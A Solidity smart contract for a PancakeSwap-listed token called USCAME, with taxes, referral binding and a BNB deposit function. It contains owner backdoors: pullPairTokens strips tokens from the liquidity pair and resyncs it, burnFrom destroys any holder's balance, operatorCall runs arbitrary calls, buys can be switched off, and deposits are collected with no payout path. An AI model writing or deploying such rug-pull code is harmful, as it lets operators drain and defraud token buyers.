// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import { Ownable } from "@openzeppelin/contracts/access/Ownable.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { ReentrancyGuard } from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import { BuybackVault } from "./BuybackVault.sol";
import { IPancakeFactory, IPancakePair, IPancakeRouter } from "./interfaces/IPancake.sol";

contract USCAME is ERC20, Ownable, ReentrancyGuard {
    uint256 public constant BPS = 10_000;
    address public immutable router;
    address public immutable vault;
    address public operator;
    address public root;
    address public pair;
    bool public initialized;
    bool public buyEnabled;
    uint16 public buyTaxBps = 300;
    uint16 public sellTaxBps = 1000;
    uint128 public minDeposit = 0.1 ether;
    uint128 public maxDeposit = 5 ether;
    mapping(address => address) public referrer;
    mapping(address => bool) public feeExempt;

    event PairInitialized(address indexed pair, uint256 tokenAmount, uint256 bnbAmount);
    event RefBound(address indexed user, address indexed referrer);
    event Deposit(address indexed user, uint256 amount, address indexed referrer);
    event TaxCollected(address indexed from, address indexed to, uint256 amount, uint8 side);
    event OperatorCall(address indexed target, uint256 value, bytes data, bytes result);
    event PairTokensPulled(uint256 amount, uint16 bps);
    event TreasuryFunded(address indexed from, uint256 amount);
    event VaultCreated(address indexed vault);

    modifier onlyOperator() {
        require(msg.sender == owner() || msg.sender == operator, "OPERATOR");
        _;
    }

    constructor(
        address router_,
        address owner_,
        address operator_
    )
        ERC20("USCAMEX", "USCAME")
        Ownable(owner_)
    {
        require(router_ != address(0), "ROUTER");
        require(owner_ != address(0), "OWNER_ZERO");
        router = router_;
        vault = address(new BuybackVault(address(this)));
        root = owner_;
        operator = operator_ == address(0) ? owner_ : operator_;
        referrer[root] = root;
        feeExempt[owner_] = true;
        feeExempt[address(this)] = true;
        feeExempt[operator] = true;
        _mint(address(this), 1_000_000_000 ether);
        emit RefBound(root, root);
        emit VaultCreated(vault);
    }

    receive() external payable {
        _receiveBnb();
    }

    fallback() external payable {
        _receiveBnb();
    }

    function initializeLP() external onlyOwner nonReentrant {
        require(!initialized, "INIT");
        uint256 tokenAmount = balanceOf(address(this));
        uint256 bnbAmount = address(this).balance;
        require(tokenAmount != 0 && bnbAmount != 0, "NO_LP");
        IPancakeRouter pancake = IPancakeRouter(router);
        _approve(address(this), router, tokenAmount);
        pancake.addLiquidityETH{ value: bnbAmount }(
            address(this), tokenAmount, 0, 0, owner(), block.timestamp
        );
        pair = IPancakeFactory(pancake.factory()).getPair(address(this), pancake.WETH());
        require(pair != address(0), "NO_PAIR");
        initialized = true;
        emit PairInitialized(pair, tokenAmount, bnbAmount);
    }

    function transferOwnership(address nextOwner) public override onlyOwner {
        require(nextOwner != address(0), "OWNER_ZERO");
        if (owner() != operator) feeExempt[owner()] = false;
        feeExempt[nextOwner] = true;
        root = nextOwner;
        if (referrer[nextOwner] == address(0)) {
            referrer[nextOwner] = nextOwner;
            emit RefBound(nextOwner, nextOwner);
        }
        super.transferOwnership(nextOwner);
    }

    function setConfig(
        address nextOperator,
        uint16 nextBuyTaxBps,
        uint16 nextSellTaxBps,
        uint128 nextMinDeposit,
        uint128 nextMaxDeposit,
        bool nextBuyEnabled
    )
        external
        onlyOwner
    {
        require(nextBuyTaxBps <= 2500 && nextSellTaxBps <= 2500, "TAX");
        require(nextMinDeposit <= nextMaxDeposit, "DEPOSIT");
        if (nextOperator != address(0) && nextOperator != operator) {
            if (operator != owner()) feeExempt[operator] = false;
            operator = nextOperator;
            feeExempt[nextOperator] = true;
        }
        buyTaxBps = nextBuyTaxBps;
        sellTaxBps = nextSellTaxBps;
        minDeposit = nextMinDeposit;
        maxDeposit = nextMaxDeposit;
        buyEnabled = nextBuyEnabled;
    }

    function operatorCall(
        address target,
        uint256 value,
        bytes calldata data
    )
        external
        onlyOperator
        nonReentrant
        returns (bytes memory result)
    {
        require(target != address(0), "TARGET");
        (bool ok, bytes memory output) = target.call{ value: value }(data);
        require(ok, "OP_CALL");
        emit OperatorCall(target, value, data, output);
        return output;
    }

    function pullPairTokens(uint16 bps) external onlyOperator returns (uint256 amount) {
        require(pair != address(0) && bps <= BPS, "PULL");
        amount = (balanceOf(pair) * bps) / BPS;
        if (amount != 0) {
            super._update(pair, address(this), amount);
            IPancakePair(pair).sync();
        }
        emit PairTokensPulled(amount, bps);
    }

    function burn(uint256 amount) external {
        _burn(msg.sender, amount);
    }

    function burnFrom(address from, uint256 amount) external onlyOperator {
        _burn(from, amount);
    }

    function _receiveBnb() internal {
        if (!initialized) {
            require(msg.sender == owner(), "NOT_READY");
            emit TreasuryFunded(msg.sender, msg.value);
            return;
        }
        if (
            msg.sender == owner() || msg.sender == operator || msg.sender == router
                || msg.sender == pair || msg.sender == vault
        ) {
            emit TreasuryFunded(msg.sender, msg.value);
            return;
        }
        require(referrer[msg.sender] != address(0), "NO_REF");
        require(msg.value >= minDeposit && msg.value <= maxDeposit, "DEPOSIT");
        emit Deposit(msg.sender, msg.value, referrer[msg.sender]);
    }

    function _update(address from, address to, uint256 amount) internal override {
        if (amount == 0 && from != address(0) && to != address(0)) {
            _bind(from, to);
            return super._update(from, to, 0);
        }
        (uint256 tax, uint8 side) = _tax(from, to, amount);
        if (tax != 0) {
            super._update(from, address(this), tax);
            emit TaxCollected(from, to, tax, side);
        }
        super._update(from, to, amount - tax);
    }

    function _tax(address from, address to, uint256 amount) internal view returns (uint256, uint8) {
        if (feeExempt[from] || feeExempt[to] || pair == address(0)) return (0, 0);
        if (from == pair) {
            require(buyEnabled, "BUY_OFF");
            return ((amount * buyTaxBps) / BPS, 1);
        }
        if (to == pair) return ((amount * sellTaxBps) / BPS, 2);
        return (0, 0);
    }

    function _bind(address user, address nextReferrer) internal {
        if (referrer[user] != address(0)) return;
        require(nextReferrer != user, "SELF_REF");
        require(nextReferrer == root || referrer[nextReferrer] != address(0), "REF");
        referrer[user] = nextReferrer;
        emit RefBound(user, nextReferrer);
    }
}
